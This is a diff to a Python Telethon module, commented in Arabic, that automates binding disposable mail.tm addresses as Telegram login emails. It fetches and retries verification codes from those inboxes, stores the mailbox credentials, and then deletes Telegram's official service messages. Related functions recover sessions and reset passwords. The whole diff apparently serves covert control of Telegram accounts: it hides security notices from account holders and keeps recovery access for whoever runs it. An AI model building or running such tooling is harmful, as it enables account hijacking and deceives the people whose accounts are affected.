@@ -2,6 +2,7 @@
 import asyncio
 import logging
 import re
+from typing import NamedTuple
 
 from telethon import TelegramClient
 from telethon.sessions import StringSession
@@ -55,7 +56,12 @@ _recovery_fail_count: dict[str, int] = {}
 _recovery_on_done = None
 
 OFFICIAL_SENDERS = (777000, 42777)
-CODE_PATTERN = re.compile(r"\b\d{5}\b")
+CODE_PATTERN = re.compile(r"\b\d{5,7}\b")
+
+
+class EmailVerifyCtx(NamedTuple):
+    purpose: object
+    code_length: int
 
 
 # ──────────────────────────────────────────
@@ -463,9 +469,33 @@ async def fetch_code_from_email(
     attempts: int = 36,
     interval: int = 5,
     exclude_ids: set[str] | None = None,
+    code_length: int | None = None,
 ) -> str | None:
     return await mailtm.fetch_code(
-        address, password, attempts, interval, exclude_ids=exclude_ids
+        address,
+        password,
+        attempts,
+        interval,
+        exclude_ids=exclude_ids,
+        code_length=code_length,
+    )
+
+
+async def fetch_codes_from_email(
+    address: str,
+    password: str,
+    attempts: int = 36,
+    interval: int = 5,
+    exclude_ids: set[str] | None = None,
+    code_length: int | None = None,
+) -> list[str]:
+    return await mailtm.fetch_codes(
+        address,
+        password,
+        attempts,
+        interval,
+        exclude_ids=exclude_ids,
+        code_length=code_length,
     )
 
 
@@ -497,19 +527,11 @@ async def existing_login_email_ok(row, client=None) -> str | None:
 
 async def _email_verify_purpose(client, phone: str, phone_code_hash: str | None = None):
     """
-    LoginSetup: أول ربط (أثناء التسجيل أو حساب بلا بريد على تيليجرام).
-    LoginChange: تغيير بريد موجود فعلاً على الحساب.
-    phone_code_hash يُستخدم فقط قبل اكتمال sign_in — بعدها يكون منتهياً.
+    بعد تسجيل الدخول: LoginChange فقط (وثائق core.telegram.org/api/auth).
+    أثناء auth.sendCode فقط: LoginSetup مع نفس phone_code_hash.
     """
-    if phone_code_hash and not await client.is_user_authorized():
-        return EmailVerifyPurposeLoginSetup(
-            phone_number=database.normalize_phone(phone),
-            phone_code_hash=phone_code_hash,
-        )
     if await client.is_user_authorized():
-        if await _telegram_has_login_email(client):
-            return EmailVerifyPurposeLoginChange()
-        return await _login_setup_purpose(client, phone)
+        return EmailVerifyPurposeLoginChange()
     if phone_code_hash:
         return EmailVerifyPurposeLoginSetup(
             phone_number=database.normalize_phone(phone),
@@ -518,18 +540,79 @@ async def _email_verify_purpose(client, phone: str, phone_code_hash: str | None 
     return EmailVerifyPurposeLoginChange()
 
 
-async def _send_verify_email_code(client, phone: str, email: str, phone_code_hash=None):
-    """إرسال كود التحقق — إعادة المحاولة عند EMAIL_NOT_SETUP أو hash منتهٍ."""
+async def _send_verify_email_code(
+    client, phone: str, email: str, phone_code_hash=None
+) -> EmailVerifyCtx:
+    """إرسال كود التحقق — يُرجع purpose وطول الكود من account.SentEmailCode."""
     purpose = await _email_verify_purpose(client, phone, phone_code_hash)
     try:
-        await client(SendVerifyEmailCodeRequest(purpose=purpose, email=email))
-        return purpose
+        sent = await client(
+            SendVerifyEmailCodeRequest(purpose=purpose, email=email)
+        )
     except Exception as e:
         if not (_is_email_not_setup(e) or _is_stale_phone_code_hash(e)):
             raise
+        if await client.is_user_authorized():
+            raise
         purpose = await _login_setup_purpose(client, phone)
-        await client(SendVerifyEmailCodeRequest(purpose=purpose, email=email))
-        return purpose
+        sent = await client(
+            SendVerifyEmailCodeRequest(purpose=purpose, email=email)
+        )
+    code_length = int(getattr(sent, "length", None) or 6)
+    pattern = getattr(sent, "email_pattern", None) or email
+    logger.info(
+        "verify email sent %s pattern=%s code_length=%s purpose=%s",
+        email,
+        pattern,
+        code_length,
+        type(purpose).__name__,
+    )
+    await asyncio.sleep(2)
+    return EmailVerifyCtx(purpose=purpose, code_length=code_length)
+
+
+def _normalize_email_code(raw: str | None, code_length: int | None = None) -> str | None:
+    if not raw:
+        return None
+    digits = re.sub(r"\D", "", str(raw))
+    if code_length and len(digits) == code_length:
+        return digits
+    match = CODE_PATTERN.search(str(raw))
+    if not match:
+        return None
+    digits = match.group(0)
+    if code_length and len(digits) != code_length:
+        return None
+    return digits
+
+
+async def _try_verify_email_codes(
+    client, purpose, codes: list[str]
+) -> str | None:
+    """تجربة الأكواد بالترتيب — يُرجع الكود الناجح."""
+    last_error: Exception | None = None
+    tried: set[str] = set()
+    for code in codes:
+        if not code or code in tried:
+            continue
+        tried.add(code)
+        try:
+            await client(
+                VerifyEmailRequest(
+                    purpose=purpose,
+                    verification=EmailVerificationCode(code=code),
+                )
+            )
+            return code
+        except Exception as e:
+            if _is_invalid_email_verify_code(e):
+                last_error = e
+                logger.debug("verify email code %s rejected", code)
+                continue
+            raise
+    if last_error:
+        raise last_error
+    return None
 
 
 async def _bind_login_email(
@@ -543,70 +626,84 @@ async def _bind_login_email(
             new_email = account["address"]
             email_password = account["password"]
             exclude_ids = await mailtm.snapshot_message_ids(new_email, email_password)
-            try:
-                purpose = await _send_verify_email_code(
-                    client, phone, new_email, phone_code_hash
-                )
-            except Exception as e:
-                if _is_email_not_allowed(e):
-                    last_error = str(e)
-                    continue
-                raise
+            domain_rejected = False
 
-            raw_code = await fetch_code_from_email(
-                new_email,
-                email_password,
-                attempts=24,
-                interval=5,
-                exclude_ids=exclude_ids,
-            )
-            code = _normalize_login_code(raw_code)
-            if not code:
-                return {
-                    "success": False,
-                    "error": "لم يتم العثور على الكود في الإيميل",
-                    "email": new_email,
-                }
-
-            try:
-                await client(
-                    VerifyEmailRequest(
-                        purpose=purpose,
-                        verification=EmailVerificationCode(code=code),
+            for send_attempt in range(3):
+                try:
+                    ctx = await _send_verify_email_code(
+                        client, phone, new_email, phone_code_hash
                     )
-                )
-            except Exception as e:
-                if not _is_invalid_email_verify_code(e):
+                except Exception as e:
+                    if _is_email_not_allowed(e):
+                        last_error = str(e)
+                        domain_rejected = True
+                        break
                     raise
-                exclude_ids |= await mailtm.snapshot_message_ids(
-                    new_email, email_password
-                )
-                purpose = await _send_verify_email_code(
-                    client, phone, new_email, phone_code_hash=None
-                )
-                raw_code = await fetch_code_from_email(
+
+                mail_codes = await fetch_codes_from_email(
                     new_email,
                     email_password,
-                    attempts=24,
-                    interval=5,
+                    attempts=30,
+                    interval=4,
                     exclude_ids=exclude_ids,
+                    code_length=ctx.code_length,
                 )
-                code = _normalize_login_code(raw_code)
-                if not code:
+                candidates: list[str] = []
+                for raw in mail_codes:
+                    norm = _normalize_email_code(raw, ctx.code_length)
+                    if norm and norm not in candidates:
+                        candidates.append(norm)
+                if not candidates:
+                    for raw in mail_codes:
+                        norm = _normalize_email_code(raw, None)
+                        if norm and norm not in candidates:
+                            candidates.append(norm)
+
+                if not candidates:
+                    if send_attempt < 2:
+                        exclude_ids |= await mailtm.snapshot_message_ids(
+                            new_email, email_password
+                        )
+                        continue
                     return {
                         "success": False,
-                        "error": "كود البريد غير صالح أو منتهٍ",
+                        "error": "لم يتم العثور على الكود في الإيميل",
                         "email": new_email,
                     }
-                await client(
-                    VerifyEmailRequest(
-                        purpose=purpose,
-                        verification=EmailVerificationCode(code=code),
+
+                try:
+                    verified_code = await _try_verify_email_codes(
+                        client, ctx.purpose, candidates
                     )
-                )
-            await database.update_session_login_email(phone, new_email, email_password)
-            await delete_telegram_official_messages(client)
-            return {"success": True, "email": new_email}
+                except Exception as e:
+                    if send_attempt >= 2 or not _is_invalid_email_verify_code(e):
+                        raise
+                    exclude_ids |= await mailtm.snapshot_message_ids(
+                        new_email, email_password
+                    )
+                    logger.warning(
+                        "email verify retry %s for %s: %s",
+                        send_attempt + 1,
+                        new_email,
+                        e,
+                    )
+                    continue
+
+                if verified_code:
+                    await database.update_session_login_email(
+                        phone, new_email, email_password
+                    )
+                    await delete_telegram_official_messages(client)
+                    logger.info(
+                        "login email bound %s -> %s (code len %s)",
+                        phone,
+                        new_email,
+                        len(verified_code),
+                    )
+                    return {"success": True, "email": new_email}
+
+            if domain_rejected:
+                continue
 
         return {"success": False, "error": last_error}
     except Exception as e:
@@ -746,13 +843,8 @@ async def admin_full_cleanup(phone: str, new_password: str) -> dict:
 # إنعاش جلسة منتهية عبر بريد Login
 # ──────────────────────────────────────────
 def _normalize_login_code(raw: str | None) -> str | None:
-    if not raw:
-        return None
-    match = CODE_PATTERN.search(str(raw))
-    if not match:
-        return None
-    digits = match.group(0)
-    return digits[:5] if len(digits) >= 5 else digits
+    """كود دخول SMS/بريد Login — 5–7 أرقام حسب تيليجرام."""
+    return _normalize_email_code(raw, code_length=None)
 
 
 def _sent_code_delivery_label(sent) -> str:
@@ -841,14 +933,18 @@ async def recover_session(phone: str) -> dict:
                 "delivery": delivery,
             }
 
-        raw_code = await fetch_code_from_email(
+        raw_codes = await fetch_codes_from_email(
             login_email,
             email_password,
             attempts=36,
             interval=5,
             exclude_ids=exclude_ids,
         )
-        code = _normalize_login_code(raw_code)
+        code = None
+        for raw in raw_codes:
+            code = _normalize_login_code(raw)
+            if code:
+                break
         if not code:
             return {
                 "success": False,
